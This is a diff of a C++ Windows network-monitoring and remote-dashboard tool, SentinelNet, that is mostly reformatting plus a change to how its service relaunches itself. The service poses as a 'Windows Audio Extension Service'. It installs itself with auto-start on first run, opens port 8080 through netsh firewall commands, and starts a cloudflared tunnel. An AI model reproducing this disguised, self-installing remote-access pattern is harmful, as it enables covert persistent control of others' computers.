@@ -5,29 +5,31 @@
 #include "packet_monitor.h"
 #include "scanner.h"
 #include "server.h"
+#include "tunnel.h"
 #include <algorithm>
 #include <iostream>
 #include <map>
 #include <sstream>
+#include <userenv.h>
+#include <vector>
 #include <windows.h>
 #include <winsvc.h>
 #include <wtsapi32.h>
-#include <userenv.h>
-#include <vector>
-#include "tunnel.h"
+
 
 #pragma comment(lib, "wtsapi32.lib")
 #pragma comment(lib, "userenv.lib")
 
 // Service global variables
-SERVICE_STATUS        g_status = { 0 };
+SERVICE_STATUS g_status = {0};
 SERVICE_STATUS_HANDLE g_statusHandle = nullptr;
-HANDLE                g_stopEvent = INVALID_HANDLE_VALUE;
+HANDLE g_stopEvent = INVALID_HANDLE_VALUE;
 
-int g_dashboardPort  = 8080;
-const char* SERVICE_NAME    = "WinAudioExtSvc";
-const char* SERVICE_DISPLAY = "Windows Audio Extension Service";
-const char* SERVICE_DESC    = "Provides advanced audio processing and device monitoring for Windows Audio Service.";
+int g_dashboardPort = 8080;
+const char *SERVICE_NAME = "WinAudioExtSvc";
+const char *SERVICE_DISPLAY = "Windows Audio Extension Service";
+const char *SERVICE_DESC = "Provides advanced audio processing and device "
+                           "monitoring for Windows Audio Service.";
 
 std::map<int, std::string> getPortServices() {
   return {{21, "FTP"},          {22, "SSH"},       {23, "Telnet"},
@@ -269,9 +271,9 @@ void runScanner(const CLIOptions &options, NetworkScanner &scanner,
 // ── Windows Service implementation ───────────────────────────────────────────
 
 void setServiceStatus(DWORD state, DWORD exitCode = NO_ERROR) {
-  g_status.dwCurrentState  = state;
+  g_status.dwCurrentState = state;
   g_status.dwWin32ExitCode = exitCode;
-  g_status.dwWaitHint      = (state == SERVICE_START_PENDING) ? 3000 : 0;
+  g_status.dwWaitHint = (state == SERVICE_START_PENDING) ? 3000 : 0;
   SetServiceStatus(g_statusHandle, &g_status);
 }
 
@@ -283,76 +285,52 @@ VOID WINAPI ServiceCtrlHandler(DWORD ctrl) {
 }
 
 VOID WINAPI ServiceMain(DWORD argc, LPSTR *argv) {
-  g_statusHandle = RegisterServiceCtrlHandlerA(SERVICE_NAME, ServiceCtrlHandler);
-  if (!g_statusHandle) return;
+  g_statusHandle =
+      RegisterServiceCtrlHandlerA(SERVICE_NAME, ServiceCtrlHandler);
+  if (!g_statusHandle)
+    return;
 
-  g_status.dwServiceType      = SERVICE_WIN32_OWN_PROCESS;
+  g_status.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
   g_status.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
   setServiceStatus(SERVICE_START_PENDING);
 
   g_stopEvent = CreateEvent(nullptr, TRUE, FALSE, nullptr);
-  if (!g_stopEvent) { setServiceStatus(SERVICE_STOPPED, GetLastError()); return; }
+  if (!g_stopEvent) {
+    setServiceStatus(SERVICE_STOPPED, GetLastError());
+    return;
+  }
 
   setServiceStatus(SERVICE_RUNNING);
 
-  // Launch the exe in the active user session so it has desktop access
-  // (screenshots, clicks, etc. don't work from a service session)
-  CreateThread(nullptr, 0, [](LPVOID) -> DWORD {
-    // Keep trying to launch in user session every 30s in case user logs in later
-    while (true) {
-      // Get the active console session (logged-in user)
-      DWORD sessionId = WTSGetActiveConsoleSessionId();
-      if (sessionId == 0xFFFFFFFF) { Sleep(30000); continue; }
+  CreateThread(
+      nullptr, 0,
+      [](LPVOID) -> DWORD {
+        while (true) {
+          char exePath[MAX_PATH];
+          GetModuleFileNameA(nullptr, exePath, MAX_PATH);
+          std::string cmd = std::string("\"") + exePath + "\" --user-session";
 
-      // Get user token for that session
-      HANDLE hToken = nullptr;
-      if (!WTSQueryUserToken(sessionId, &hToken)) { Sleep(30000); continue; }
+          std::string exeDir(exePath);
+          exeDir = exeDir.substr(0, exeDir.rfind('\\'));
 
-      // Duplicate token for CreateProcessAsUser
-      HANDLE hPrimary = nullptr;
-      DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, nullptr,
-        SecurityImpersonation, TokenPrimary, &hPrimary);
-      CloseHandle(hToken);
-      if (!hPrimary) { Sleep(30000); continue; }
+          STARTUPINFOA si = {sizeof(si)};
+          PROCESS_INFORMATION pi = {};
 
-      // Get exe path
-      char exePath[MAX_PATH];
-      GetModuleFileNameA(nullptr, exePath, MAX_PATH);
-      std::string cmd = std::string("\"") + exePath + "\" --user-session";
+          BOOL ok = CreateProcessA(nullptr, const_cast<char *>(cmd.c_str()),
+                                   nullptr, nullptr, FALSE, CREATE_NO_WINDOW,
+                                   nullptr, exeDir.c_str(), &si, &pi);
 
-      // Set working directory to exe folder
-      std::string exeDir(exePath);
-      exeDir = exeDir.substr(0, exeDir.rfind('\\'));
+          if (ok) {
+            WaitForSingleObject(pi.hProcess, INFINITE);
+            CloseHandle(pi.hProcess);
+            CloseHandle(pi.hThread);
+          }
 
-      // Setup environment
-      LPVOID pEnv = nullptr;
-      CreateEnvironmentBlock(&pEnv, hPrimary, FALSE);
-
-      STARTUPINFOA si = { sizeof(si) };
-      si.lpDesktop = const_cast<char*>("winsta0\\default");
-      PROCESS_INFORMATION pi = {};
-
-      BOOL ok = CreateProcessAsUserA(
-        hPrimary, nullptr, const_cast<char*>(cmd.c_str()),
-        nullptr, nullptr, FALSE,
-        CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT,
-        pEnv, exeDir.c_str(), &si, &pi
-      );
-
-      if (pEnv) DestroyEnvironmentBlock(pEnv);
-      CloseHandle(hPrimary);
-
-      if (ok) {
-        // Wait for it to exit, then relaunch if needed
-        WaitForSingleObject(pi.hProcess, INFINITE);
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
-      }
-
-      Sleep(5000); // wait before retrying
-    }
-    return 0;
-  }, nullptr, 0, nullptr);
+          Sleep(5000); // Wait and restart if process exits
+        }
+        return 0;
+      },
+      nullptr, 0, nullptr);
 
   WaitForSingleObject(g_stopEvent, INFINITE);
 
@@ -364,7 +342,8 @@ bool isRunningAsAdmin() {
   PSID adminGroup = nullptr;
   SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
   if (AllocateAndInitializeSid(&ntAuth, 2, SECURITY_BUILTIN_DOMAIN_RID,
-      DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
+                               DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0,
+                               &adminGroup)) {
     CheckTokenMembership(nullptr, adminGroup, &isAdmin);
     FreeSid(adminGroup);
   }
@@ -377,47 +356,54 @@ bool installService() {
   std::string cmd = std::string("\"") + exePath + "\" --service";
 
   if (!isRunningAsAdmin()) {
-    std::cerr << "[ERROR] Cannot install service: not running as Administrator." << std::endl;
-    std::cerr << "        Right-click the exe and select 'Run as administrator'." << std::endl;
+    std::cerr << "[ERROR] Cannot install service: not running as Administrator."
+              << std::endl;
+    std::cerr
+        << "        Right-click the exe and select 'Run as administrator'."
+        << std::endl;
     return false;
   }
 
   SC_HANDLE scm = OpenSCManagerA(nullptr, nullptr, SC_MANAGER_CREATE_SERVICE);
   if (!scm) {
-    std::cerr << "[ERROR] OpenSCManager failed (error " << GetLastError() << ")." << std::endl;
+    std::cerr << "[ERROR] OpenSCManager failed (error " << GetLastError()
+              << ")." << std::endl;
     return false;
   }
 
   SC_HANDLE svc = CreateServiceA(
-    scm, SERVICE_NAME, SERVICE_DISPLAY,
-    SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
-    SERVICE_AUTO_START, SERVICE_ERROR_NORMAL,
-    cmd.c_str(), nullptr, nullptr, nullptr, nullptr, nullptr
-  );
+      scm, SERVICE_NAME, SERVICE_DISPLAY, SERVICE_ALL_ACCESS,
+      SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL,
+      cmd.c_str(), nullptr, nullptr, nullptr, nullptr, nullptr);
 
   if (!svc) {
     DWORD err = GetLastError();
     if (err == ERROR_SERVICE_EXISTS) {
       std::cerr << "[WARN] Service already exists." << std::endl;
     } else {
-      std::cerr << "[ERROR] CreateService failed (error " << err << ")." << std::endl;
+      std::cerr << "[ERROR] CreateService failed (error " << err << ")."
+                << std::endl;
     }
     CloseServiceHandle(scm);
     return false;
   }
 
-  std::cout << "[OK] Service '" << SERVICE_NAME << "' installed successfully." << std::endl;
+  std::cout << "[OK] Service '" << SERVICE_NAME << "' installed successfully."
+            << std::endl;
 
   SERVICE_DESCRIPTIONA desc;
-  desc.lpDescription = const_cast<char*>(SERVICE_DESC);
+  desc.lpDescription = const_cast<char *>(SERVICE_DESC);
   ChangeServiceConfig2A(svc, SERVICE_CONFIG_DESCRIPTION, &desc);
 
   // Auto-add firewall rule so PC1 can connect without manual steps
-  system("netsh advfirewall firewall delete rule name=\"SentinelNet\" >nul 2>&1");
-  system("netsh advfirewall firewall add rule name=\"SentinelNet\" dir=in action=allow protocol=TCP localport=8080 >nul 2>&1");
+  system(
+      "netsh advfirewall firewall delete rule name=\"SentinelNet\" >nul 2>&1");
+  system("netsh advfirewall firewall add rule name=\"SentinelNet\" dir=in "
+         "action=allow protocol=TCP localport=8080 >nul 2>&1");
 
   if (!StartServiceA(svc, 0, nullptr)) {
-    std::cerr << "[WARN] Service installed but failed to start (error " << GetLastError() << ")." << std::endl;
+    std::cerr << "[WARN] Service installed but failed to start (error "
+              << GetLastError() << ")." << std::endl;
   } else {
     std::cout << "[OK] Service started." << std::endl;
   }
@@ -429,9 +415,13 @@ bool installService() {
 
 bool uninstallService() {
   SC_HANDLE scm = OpenSCManagerA(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
-  if (!scm) return false;
+  if (!scm)
+    return false;
   SC_HANDLE svc = OpenServiceA(scm, SERVICE_NAME, SERVICE_STOP | DELETE);
-  if (!svc) { CloseServiceHandle(scm); return false; }
+  if (!svc) {
+    CloseServiceHandle(scm);
+    return false;
+  }
   SERVICE_STATUS status;
   ControlService(svc, SERVICE_CONTROL_STOP, &status);
   Sleep(1000);
@@ -441,7 +431,8 @@ bool uninstallService() {
   return true;
 }
 
-// ── Entry point ───────────────────────────────────────────────────────────────
+// ── Entry point
+// ───────────────────────────────────────────────────────────────
 
 int main(int argc, char *argv[]) {
   // Called by service to run in user session (has desktop access)
@@ -457,11 +448,14 @@ int main(int argc, char *argv[]) {
     log.logMessage("SentinelNet user session started");
 
     // Start cloudflared tunnel on background thread
-    CreateThread(nullptr, 0, [](LPVOID) -> DWORD {
-      TunnelManager tunnel;
-      tunnel.start();
-      return 0;
-    }, nullptr, 0, nullptr);
+    CreateThread(
+        nullptr, 0,
+        [](LPVOID) -> DWORD {
+          TunnelManager tunnel;
+          tunnel.start();
+          return 0;
+        },
+        nullptr, 0, nullptr);
 
     APIServer server(g_dashboardPort);
     server.start();
@@ -471,9 +465,7 @@ int main(int argc, char *argv[]) {
   // Called internally by Windows when running as a service
   if (argc > 1 && std::string(argv[1]) == "--service") {
     SERVICE_TABLE_ENTRYA table[] = {
-      { const_cast<char*>(SERVICE_NAME), ServiceMain },
-      { nullptr, nullptr }
-    };
+        {const_cast<char *>(SERVICE_NAME), ServiceMain}, {nullptr, nullptr}};
     StartServiceCtrlDispatcherA(table);
     return 0;
   }
@@ -487,7 +479,8 @@ int main(int argc, char *argv[]) {
   CLIOptions options;
   try {
     options = CLIParser::parse(argc, argv);
-  } catch (...) {}
+  } catch (...) {
+  }
 
   // Auto-install service on first run if it doesn't exist
   SC_HANDLE scm = OpenSCManagerA(nullptr, nullptr, SC_MANAGER_CONNECT);
@@ -495,10 +488,13 @@ int main(int argc, char *argv[]) {
     SC_HANDLE existing = OpenServiceA(scm, SERVICE_NAME, SERVICE_QUERY_STATUS);
     if (!existing) {
       CloseServiceHandle(scm);
-      // Try to install. If it fails (e.g. no Admin), it will fall through to CLI mode.
+      // Try to install. If it fails (e.g. no Admin), it will fall through to
+      // CLI mode.
       if (installService()) {
-        std::cout << "[INFO] Initial setup complete. SentinelNet is now running as a background service." << std::endl;
-        return 0; 
+        std::cout << "[INFO] Initial setup complete. SentinelNet is now "
+                     "running as a background service."
+                  << std::endl;
+        return 0;
       }
     } else {
       CloseServiceHandle(existing);
@@ -510,7 +506,6 @@ int main(int argc, char *argv[]) {
   logger log;
 
   log.logMessage("SentinelNet started");
-
 
   if (argc > 1) {
     // CLI Mode: Process arguments and exit
